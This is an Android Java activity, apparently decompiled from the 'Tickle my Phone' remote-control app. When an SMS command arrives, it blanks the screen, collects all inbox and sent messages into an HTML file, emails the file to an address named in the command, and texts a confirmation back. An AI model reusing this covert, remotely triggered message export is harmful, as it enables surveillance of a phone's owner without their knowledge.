package com.jalsalabs.ticklemyphonefull;

import android.app.Activity;
import android.os.Bundle;

public class SendAllSMSDetails extends Activity {
    String LS_EmailAddress;
    String LS_SenderPhone;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TML_Library.Debug("***********************I AM INSIDE SendAllSMSDetails************************");
        TML_Library.SwitchOfftheScreen(this);
        setContentView(R.layout.working);
    }

    public void onResume() {
        String Is_EmailSent;
        super.onResume();
        TML_Library.Debug("***********************I AM INSIDE SendAllSMSDetails************************");
        TML_Library.SwitchOfftheScreen(this);
        setContentView(R.layout.working);
        this.LS_EmailAddress = TML_Library.GetParameter("BODY2NDTOKEN");
        this.LS_SenderPhone = TML_Library.GetParameter("ORIGINAL_ADDRESS");
        String SMStextMessages = TML_Library.GetSMSContentSri(this);
        String FileName = TML_Library.getTMLPath() + "ticklemyphonesms.html";
        TML_Library.CreateLogText(this, FileName, SMStextMessages);
        String SMSBody = getString(R.string.app_name) + " All SMS details (inbox and sent items)  ";
        if (TML_Library.GetInternetConnectionInfo(this).contains("no internet")) {
            Is_EmailSent = "\n" + getString(R.string.oth47_no_email_sent);
        } else {
            TML_Library.Debug("Email will  be sent to :" + this.LS_EmailAddress);
            TML_Library.SendEmail(this, TML_Library.GetU(this), TML_Library.GetP(this), this.LS_EmailAddress, "Tickle my Phone " + getString(R.string.oth59_RetrieveMessage), SMSBody, FileName);
            Is_EmailSent = "\n" + getString(R.string.oth48_email_sent_to) + this.LS_EmailAddress;
        }
        TML_Library.Debug("Sendig SMS =" + SMSBody + " " + SMSBody.length());
        TML_Library.sendSMSBig(this, this.LS_SenderPhone, new StringBuilder(String.valueOf(SMSBody)).append(Is_EmailSent).append("\n").append(getString(R.string.app_name)).toString());
        finish();
    }
}
